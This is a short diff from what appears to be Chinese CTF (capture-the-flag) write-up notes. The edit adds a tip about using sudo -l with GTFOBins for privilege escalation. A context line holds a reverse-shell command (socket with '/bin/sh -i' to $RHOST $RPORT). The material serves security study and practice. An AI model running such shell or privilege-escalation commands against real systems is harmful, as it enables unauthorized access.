@@ -665,7 +665,7 @@ RPORT=12345
 socket -qvp '/bin/sh -i' $RHOST $RPORT
 ```
 也可以将RHOST写为`0.0.0.0`，直接把shell弹到题目机器上，无需自己的公网ip。
-- [GTFOBins](https://gtfobins.github.io/)，记录了很多利用错误配置binary提权的payload。‘
+- [GTFOBins](https://gtfobins.github.io/)，记录了很多利用错误配置binary提权的payload(用sudo -l查看哪些命令无需密码，然后在里面查对应的提权方法)。
 73. [Impossible v2](https://youtu.be/obQxrfbMaHE?t=220)
 - 一题基础的格式化字符串，不过漏洞出在sprintf。题目：
 ```c
